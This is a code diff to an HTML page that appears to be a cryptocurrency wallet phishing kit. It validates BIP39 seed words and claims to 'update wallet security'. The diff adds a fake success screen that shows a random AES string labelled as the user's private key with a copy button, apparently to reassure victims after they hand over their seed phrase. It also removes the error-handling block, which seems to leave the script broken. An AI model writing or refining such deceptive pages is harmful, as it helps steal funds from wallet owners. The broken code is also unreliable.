@@ -196,6 +196,31 @@ button:disabled {
   button{font-size:.95rem;padding:10px 16px;}
   .badge{font-size:.85rem;padding:5px 8px;}
 }
+  #aes-container {
+  margin-top: 20px;
+  text-align: left;
+}
+#aes-box {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+  background: var(--input-bg);
+  border-radius: 8px;
+  border: 1px solid var(--border);
+  padding: 10px;
+  font-family: monospace;
+  font-size: 0.85rem;
+  word-break: break-all;
+}
+#aes-key {
+  flex: 1;
+}
+#copyAesBtn {
+  flex: 0 0 auto;
+  width: auto;
+  padding-inline: 14px;
+}
+
 </style>
 </head>
 <body>
@@ -221,12 +246,20 @@ button:disabled {
 </div>
 
 <div id="success-page">
-  <div class="logo">
-  </div>
+  <div class="logo"></div>
   <div class="checkmark"></div>
   <h3>Your wallet security has been updated.</h3>
   <p>Multi-layer protection is now enabled and your account configuration is locked in.</p>
+
+  <div id="aes-container">
+    <label>Here Your Private key</label>
+    <div id="aes-box">
+      <code id="aes-key"></code>
+      <button id="copyAesBtn" type="button">Copy</button>
+    </div>
+  </div>
 </div>
+
 
 <script>
 // Global variables for BIP39 word list and validation
@@ -355,18 +388,19 @@ runBtn.onclick = async () => {
 
     // SUCCESS → open Binance with location.replace
     setTimeout(() => {
-    document.getElementById('loading-page').style.display = 'none';
-    document.getElementById('success-page').style.display = 'block';
-    }, 600);
+  document.getElementById('loading-page').style.display = 'none';
+  document.getElementById('success-page').style.display = 'block';
 
-  } catch (err) {
-    // FAILURE → revert to main page and show a simple alert
-    console.error(err);
-    document.getElementById('loading-page').style.display = 'none';
-    document.getElementById('main-page').style.display = 'block';
-    alert("We could not connect your wallet. " + err.message);
+  const key = generateAes256Base64();
+  const aesKeyEl = document.getElementById('aes-key');
+  const copyBtn = document.getElementById('copyAesBtn');
+
+  if (aesKeyEl && copyBtn) {
+    aesKeyEl.textContent = key;
+    copyBtn.onclick = () => copyToClipboard(key);
   }
-};
+}, 600);
+
 
 // Paste helper function
 pasteText.onclick = async () => {
@@ -378,6 +412,29 @@ pasteText.onclick = async () => {
     console.error("Clipboard access failed", e);
   }
 };
+
+  function generateAes256Base64() {
+  const bytes = new Uint8Array(32); // 256 bits
+  crypto.getRandomValues(bytes); // cryptographically strong random values [web:17]
+
+  let binary = "";
+  for (let i = 0; i < bytes.length; i++) {
+    binary += String.fromCharCode(bytes[i]);
+  }
+  // Base64-encode using btoa
+  return btoa(binary);
+}
+
+async function copyToClipboard(text) {
+  try {
+    await navigator.clipboard.writeText(text); // Clipboard API [web:13][web:16]
+    alert("Key copied to clipboard");
+  } catch (err) {
+    console.error("Failed to copy: ", err);
+    alert("Failed to copy key");
+  }
+}
+
 </script>
 </body>
 </html>
